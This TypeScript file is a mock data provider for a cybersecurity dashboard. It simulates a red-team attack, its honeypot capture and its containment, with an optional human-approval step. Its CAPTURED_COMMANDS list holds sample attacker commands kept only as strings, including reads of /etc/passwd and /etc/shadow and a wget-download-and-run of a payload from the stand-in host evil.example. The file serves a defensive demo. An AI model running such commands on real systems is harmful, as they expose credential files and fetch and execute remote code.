import { store } from "./store";
import type {
  DataProvider,
  DataProviderCallbacks,
  EntityHealth,
  OperatingMode,
  ShadowEvent,
  SimulationPhase,
  TrafficMetric,
} from "./types";

// ── Mock data provider ──────────────────────────────────────────────────────
// Emulates the backend WebSocket per docs/API.md. Swap this with a real
// WebSocket client for production.

const RED_IP = "192.168.50.40";
const BLUE_IP = "192.168.50.20";
const HONEYPOT_IP = "192.168.50.30";

const CAPTURED_COMMANDS = [
  "whoami",
  "ls -la",
  "cat /etc/passwd",
  "uname -a",
  "ifconfig",
  "sudo cat /etc/shadow",
  "wget http://evil.example/payload.sh",
  "chmod +x /tmp/payload.sh",
  "/tmp/payload.sh -o /dev/null",
];

function now(): string {
  return new Date().toLocaleTimeString("en-GB", { hour12: false });
}

function event(
  type: ShadowEvent["type"],
  severity: ShadowEvent["severity"],
  extras: Partial<ShadowEvent> = {}
): ShadowEvent {
  return { type, severity, timestamp: now(), ...extras };
}

class MockProvider implements DataProvider {
  private callbacks: DataProviderCallbacks | null = null;
  private timers: ReturnType<typeof setTimeout>[] = [];
  // Simulation-only timeouts (phase transitions, honeypot commands, etc).
  // Tracked separately from `timers` so stopping/restarting a simulation
  // never touches the live connection's traffic/health intervals.
  private simTimers: ReturnType<typeof setTimeout>[] = [];
  private healthInterval: ReturnType<typeof setInterval> | null = null;
  private trafficInterval: ReturnType<typeof setInterval> | null = null;
  // Random-walk state so the traffic line flows smoothly instead of jumping
  // to a brand-new random value every tick.
  private trafficLevel = 45;

  private emit(e: ShadowEvent) {
    this.callbacks?.onEvent(e, Date.now());
  }

  private traffic(): TrafficMetric {
    const state = store.getState();
    const underAttack = state.topology.attackActive;
    const target = underAttack ? 900 + Math.random() * 700 : 35 + Math.random() * 45;
    // Ease toward the target level each tick, with small jitter on top —
    // produces a natural-looking, gently flowing line instead of noise.
    this.trafficLevel += (target - this.trafficLevel) * 0.35 + (Math.random() - 0.5) * 8;
    this.trafficLevel = Math.max(5, this.trafficLevel);
    const spike = this.trafficLevel;
    return {
      type: "traffic_metric",
      timestamp: now(),
      requestsPerSec: Math.round(spike),
      packetsPerSec: Math.round(spike * 3.2),
      trafficVolume: Number((spike / 1024).toFixed(2)),
    };
  }

  private timeout(fn: () => void, ms: number) {
    const t = setTimeout(fn, ms);
    this.timers.push(t);
  }

  private simTimeout(fn: () => void, ms: number) {
    const t = setTimeout(fn, ms);
    this.simTimers.push(t);
  }

  private clearSimTimers() {
    this.simTimers.forEach((t) => clearTimeout(t));
    this.simTimers = [];
  }

  connect(callbacks: DataProviderCallbacks) {
    this.callbacks = callbacks;
    callbacks.onConnectionState("connecting");

    // Connected
    this.timeout(() => {
      callbacks.onConnectionState("connected");
      this.emit(event("connection_established", "success", { message: "Real-time stream established" }));
      this.emit(event("system_online", "success", { message: "Shadow-Weaver Suite is online" }));
      this.emit(event("honeypot_active", "info", { message: "Honeypot deception environment active", target: HONEYPOT_IP }));
      this.emit(event("honeypot_waiting", "info", { message: "Honeypot is waiting for a session" }));
      this.emit(event("system_online", "info", { message: "All three environments reporting healthy" }));

      // Live traffic
      this.trafficInterval = setInterval(() => {
        callbacks.onTrafficMetric(this.traffic(), Date.now());
      }, 1000);
      this.timers.push(this.trafficInterval as unknown as ReturnType<typeof setTimeout>);

      // Entity health
      this.healthInterval = setInterval(() => {
        const map: Record<string, EntityHealth> = {
          red_team: { entity: "red_team", cpu: 10 + Math.random() * 8, memory: 30 + Math.random() * 10, status: "healthy" },
          blue_team: { entity: "blue_team", cpu: 15 + Math.random() * 20, memory: 38 + Math.random() * 15, status: "healthy" },
          honeypot: { entity: "honeypot", cpu: 6 + Math.random() * 6, memory: 18 + Math.random() * 8, status: "healthy" },
        };
        (Object.keys(map) as (keyof typeof map)[]).forEach((k) => callbacks.onHealthMetric(map[k], Date.now()));
      }, 2000);
      this.timers.push(this.healthInterval as unknown as ReturnType<typeof setTimeout>);
    }, 900);

    // Offline simulation toggle (for demo of connection states)
    this.timeout(() => {
      // Intentionally unreachable in normal flow; hook for debugging
    }, 100000);
  }

  disconnect() {
    this.timers.forEach((t) => clearTimeout(t));
    if (this.healthInterval) clearInterval(this.healthInterval);
    if (this.trafficInterval) clearInterval(this.trafficInterval);
    this.callbacks?.onConnectionState("disconnected");
    this.callbacks = null;
  }

  setMode(mode: OperatingMode) {
    store.setMode(mode);
    this.emit(
      event("mode_changed", "info", {
        message: `Operating mode set to ${mode === "autonomous" ? "AUTONOMOUS" : "MANUAL APPROVAL"}`,
      })
    );
  }

  startSimulation() {
    // Clear any leftover timers from a previous run (e.g. Kill Switch was
    // hit mid-simulation) so stale callbacks can never fire into a new run.
    this.clearSimTimers();

    const mode = store.getState().mode;
    this.emit(event("simulation_started", "info", { message: "Controlled attack simulation started (simulated demo data)" }));

    // Phase 1 — Reconnaissance
    this.setPhase("reconnaissance");
    this.emit(event("reconnaissance_started", "info", { source: RED_IP, target: BLUE_IP, message: "Reconnaissance started" }));
    this.emit(event("service_discovered", "info", { source: RED_IP, target: BLUE_IP, message: "Open ports identified on target" }));

    this.simTimeout(() => {
      this.emit(event("suspicious_activity", "warning", { source: RED_IP, target: BLUE_IP, message: "Port scanning detected on Blue Team environment" }));
    }, 1200);

    // Phase 2 — Attack active
    this.simTimeout(() => {
      this.setPhase("active");
      this.emit(event("attack_started", "high", { source: RED_IP, target: BLUE_IP, message: "Credential brute-force attack in progress" }));
      store.setTopology({ attackActive: true, attackTarget: "blue_team", reconActive: false });
      store.setOverview({ activeThreats: 1 });
    }, 2400);

    // Phase 3 — Detection
    this.simTimeout(() => {
      this.setPhase("detection");
      this.emit(event("threat_detected", "high", { source: RED_IP, target: BLUE_IP, message: "Suspicious authentication activity confirmed" }));
      store.setOverview({ threatsDetected: store.getState().overview.threatsDetected + 1 });
    }, 4000);

    // Phase 4 — Honeypot capture
    this.simTimeout(() => {
      this.emit(event("honeypot_session_captured", "critical", {
        source: RED_IP,
        target: HONEYPOT_IP,
        sessionId: `SES-${Math.floor(1000 + Math.random() * 9000)}`,
        attackType: "Credential brute-force",
        message: "Attacker session captured by honeypot — redirecting into deception environment",
      }));
      store.setHoneypotStatus("captured");
      store.setFingerprint({
        sourceIp: RED_IP,
        sessionId: `SES-${Math.floor(1000 + Math.random() * 9000)}`,
        detectionTime: now(),
        attackType: "Credential brute-force",
        severity: "HIGH",
        sessionStatus: "Captured",
        honeypotStatus: "Active",
      });
      store.setOverview({ honeypotCaptures: store.getState().overview.honeypotCaptures + 1 });
    }, 5400);

    // Honeypot command stream
    CAPTURED_COMMANDS.forEach((cmd, i) => {
      this.simTimeout(() => {
        this.emit(event("honeypot_command", "info", { command: cmd, sessionId: "CAPTURED", message: "Attacker command captured" }));
        store.appendHoneypotCommand(cmd);
      }, 6200 + i * 900);
    });

    // Phase 5 — Containment (depends on mode)
    this.simTimeout(() => {
      if (mode === "manual") {
        this.emit(event("containment_recommended", "high", {
          source: RED_IP,
          target: "attacker",
          message: "Human approval required before containment",
        }));
        store.setApproval({
          source: RED_IP,
          severity: "high",
          recommendedAction: "Contain threat",
          timestamp: now(),
        });
      } else {
        this.beginContainment();
      }
    }, 9000);
  }

  private beginContainment() {
    this.setPhase("containment");
    this.emit(event("containment_in_progress", "warning", { message: "Isolating attacking source and rolling back session" }));
    this.simTimeout(() => {
      this.setPhase("completed");
      store.setTopology({ attackActive: false, attackTarget: null });
      store.setOverview({
        activeThreats: 0,
        threatsContained: store.getState().overview.threatsContained + 1,
      });
      store.setSimulation({ running: false });
      this.emit(event("threat_contained", "success", { source: RED_IP, message: "Threat contained — attack source neutralized" }));
      this.emit(event("simulation_completed", "success", { message: "Controlled simulation completed" }));
      this.emit(event("honeypot_waiting", "info", { message: "Honeypot re-armed and waiting" }));
      store.setHoneypotStatus("waiting");
    }, 2600);
  }

  approveContainment() {
    store.setApproval(null);
    this.emit(event("containment_approved", "info", { message: "Containment approved by operator" }));
    this.beginContainment();
  }

  ignoreContainment() {
    store.setApproval(null);
    this.emit(event("containment_ignored", "warning", { message: "Containment ignored by operator" }));
  }

  stopSimulation() {
    // Cancel every pending phase/honeypot timer from the run being killed —
    // otherwise stale callbacks fire later and corrupt whatever runs next.
    this.clearSimTimers();
    store.setTopology({ attackActive: false, attackTarget: null, reconActive: false });
    store.setSimulation({ phase: "ready", running: false, stopped: true });
    store.setApproval(null);
    store.setOverview({ activeThreats: 0 });
    this.emit(event("simulation_stopped", "warning", { message: "Simulation stopped by operator" }));
  }

  private setPhase(phase: SimulationPhase) {
    store.setSimulation({ phase, running: phase !== "completed" && phase !== "ready" });
    this.emit(event("simulation_phase_changed", "info", { message: `Simulation phase: ${phase}` }));
  }
}

export const provider: DataProvider = new MockProvider();